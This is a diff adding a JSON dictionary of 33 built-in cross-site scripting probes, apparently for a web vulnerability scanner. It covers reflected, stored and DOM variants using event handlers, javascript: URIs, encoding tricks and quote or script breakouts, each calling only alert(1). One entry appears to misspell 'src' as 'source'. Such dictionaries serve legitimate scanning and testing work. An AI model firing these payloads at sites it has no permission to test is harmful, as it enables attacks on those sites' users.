@@ -1,0 +1,173 @@
+﻿{
+  "name": "Built-in XSS payloads",
+  "description": "Default reflected, stored and DOM XSS payload dictionary",
+  "version": "3.0",
+  "payloads": [
+    {
+      "name": "basic-script",
+      "payload": "<script>alert(1)</script>",
+      "type": "reflected",
+      "description": "Basic script tag payload"
+    },
+    {
+      "name": "img-onerror",
+      "payload": "<img src=x onerror=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "svg-onload",
+      "payload": "<svg/onload=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "iframe-onload",
+      "payload": "<iframe onload=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "body-onload",
+      "payload": "<body onload=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "input-onfocus",
+      "payload": "<input autofocus onfocus=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "textarea-onfocus",
+      "payload": "<textarea autofocus onfocus=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "details-ontoggle",
+      "payload": "<details open ontoggle=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "video-onerror",
+      "payload": "<video><source onerror=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "math-href",
+      "payload": "<math><a xlink:href=javascript:alert(1)>click</a></math>",
+      "type": "reflected"
+    },
+    {
+      "name": "javascript-href",
+      "payload": "<a href=javascript:alert(1)>click</a>",
+      "type": "reflected"
+    },
+    {
+      "name": "data-uri",
+      "payload": "data:text/html,<svg/onload=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "mixed-case-onerror",
+      "payload": "<Img SrC=x OnErRoR=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "entity-encoded-onerror",
+      "payload": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>",
+      "type": "reflected"
+    },
+    {
+      "name": "newline-onerror",
+      "payload": "<img\nsource=x\nonerror=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "comment-break-svg",
+      "payload": "--><svg/onload=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "double-quote-breakout-svg",
+      "payload": "\"><svg/onload=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "single-quote-breakout-svg",
+      "payload": "'><svg/onload=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "double-quote-breakout-img",
+      "payload": "\"><img src=x onerror=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "single-quote-breakout-img",
+      "payload": "'><img src=x onerror=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "unquoted-attr-breakout",
+      "payload": " onmouseover=alert(1) x=",
+      "type": "reflected"
+    },
+    {
+      "name": "script-close-svg",
+      "payload": "</script><svg/onload=alert(1)>",
+      "type": "reflected"
+    },
+    {
+      "name": "script-escape-single",
+      "payload": "';alert(1);//",
+      "type": "reflected"
+    },
+    {
+      "name": "script-escape-double",
+      "payload": "\";alert(1);//",
+      "type": "reflected"
+    },
+    {
+      "name": "script-escape-template",
+      "payload": "`;alert(1);//",
+      "type": "reflected"
+    },
+    {
+      "name": "direct-script-context",
+      "payload": "alert(1)//",
+      "type": "reflected"
+    },
+    {
+      "name": "srcdoc-frame",
+      "payload": "<iframe srcdoc=\"<svg/onload=alert(1)>\"></iframe>",
+      "type": "reflected"
+    },
+    {
+      "name": "stored-svg",
+      "payload": "<svg/onload=alert(1)>",
+      "type": "stored"
+    },
+    {
+      "name": "stored-img",
+      "payload": "<img src=x onerror=alert(1)>",
+      "type": "stored"
+    },
+    {
+      "name": "stored-breakout",
+      "payload": "\"><svg/onload=alert(1)>",
+      "type": "stored"
+    },
+    {
+      "name": "dom-svg",
+      "payload": "<svg/onload=alert(1)>",
+      "type": "dom"
+    },
+    {
+      "name": "dom-img",
+      "payload": "<img src=x onerror=alert(1)>",
+      "type": "dom"
+    },
+    {
+      "name": "dom-js-url",
+      "payload": "javascript:alert(1)",
+      "type": "dom"
+    }
+  ]
+}
